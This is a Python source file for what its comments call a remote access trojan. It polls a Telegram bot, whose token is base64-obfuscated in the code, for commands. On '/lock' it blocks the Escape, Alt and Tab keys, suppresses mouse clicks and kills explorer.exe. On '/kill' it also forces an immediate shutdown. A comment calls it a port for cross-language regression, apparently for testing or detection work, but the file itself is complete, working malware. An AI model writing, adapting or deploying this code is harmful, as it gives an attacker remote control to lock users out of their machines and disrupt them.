#!/usr/bin/env python3
# Telegram-polling RAT that locks the victim's desktop on command:
# blocks the escape hatches, kills the shell, and can force a reboot.
# Ported shape for cross-language regression of the desktop-lockdown combo.
import subprocess, time, requests, keyboard, base64
from pynput import mouse

CREATE_NO_WINDOW = 0x08000000

def d(s): return base64.b64decode(s).decode()

# Bot credential kept out of `strings` by decoding it at runtime.
BOT_TOKEN = d("ODg3MTIwMTMxNTpBQUYxb0wyOWZUS0ZHNEI0MFBlb2lIdEJFa09DOG9KVWVrOA==")
CHAT_ID = "-1004344315662"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"

mouse_blocked = False
def win32_event_filter(msg, data):
    if mouse_blocked and msg in (516, 517):
        mouse_listener.suppress_event()
        return False
    return True

mouse_listener = mouse.Listener(win32_event_filter=win32_event_filter)
mouse_listener.start()

def lockdown(force_shutdown):
    global mouse_blocked
    keyboard.block_key('esc')
    keyboard.block_key('alt')
    keyboard.block_key('tab')
    mouse_blocked = True
    # Remove the shell so the taskbar and Start menu are gone.
    subprocess.run(["taskkill", "/F", "/IM", "explorer.exe"],
                   capture_output=True, creationflags=CREATE_NO_WINDOW)
    if force_shutdown:
        subprocess.run(["shutdown", "/s", "/t", "0", "/f"], capture_output=True)

last = 0
while True:
    r = requests.get(f"{API}/getUpdates", params={"offset": last + 1, "timeout": 15}, timeout=20)
    data = r.json()
    for u in data.get("result", []):
        last = max(last, u["update_id"])
        msg = u.get("message", {})
        if str(msg.get("chat", {}).get("id")) != CHAT_ID:
            continue
        text = msg.get("text", "")
        if text == "/lock":
            lockdown(force_shutdown=False)
        elif text == "/kill":
            lockdown(force_shutdown=True)
    time.sleep(3)
